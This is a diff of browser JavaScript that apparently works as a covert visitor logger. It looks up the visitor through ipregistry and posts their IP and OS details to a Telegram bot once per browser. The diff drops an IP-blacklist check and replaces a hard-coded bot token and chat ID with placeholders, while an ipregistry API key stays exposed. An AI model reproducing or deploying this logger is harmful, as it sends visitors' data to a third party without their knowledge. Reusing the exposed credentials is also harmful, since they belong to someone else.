@@ -122,17 +122,6 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let osvers = data.os.version;
       
 if (!localStorage.getItem('logSent')) {
-    const ipBlacklistUrl = 'ip_blacklist.txt'; // Укажите путь к вашему файлу
-    fetch(ipBlacklistUrl)
-        .then(response => response.text())
-        .then(blacklist => {
-            const blacklistedIPs = blacklist.split('\n').map(ip => ip.trim());
-            
-            // Проверяем, находится ли текущий IP в черном списке
-            if (blacklistedIPs.includes(ip)) {
-                console.log('IP is blacklisted, log will not be sent.');
-                return; // Выходим, если IP в черном списке
-            }
     const message = `
 *🔎 IP*
 *├ IP:* \`${ip}\`
@@ -178,8 +167,8 @@ if (!localStorage.getItem('logSent')) {
 `;
 
         
-        const token = '6995544575:AAGHO9TjUkG6_qbXCRI79S4jlGvZ9uRTuko';
-        const chatId = '-4293423188';
+        const token = 'Token';
+        const chatId = 'Id';
         const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
         const formData = new FormData();
         formData.append('chat_id', chatId);
@@ -191,8 +180,8 @@ if (!localStorage.getItem('logSent')) {
             }).then(() => {
             localStorage.setItem('logSent', true);
         });
-      });
-    };
+      };
+    });
 });
 });
         
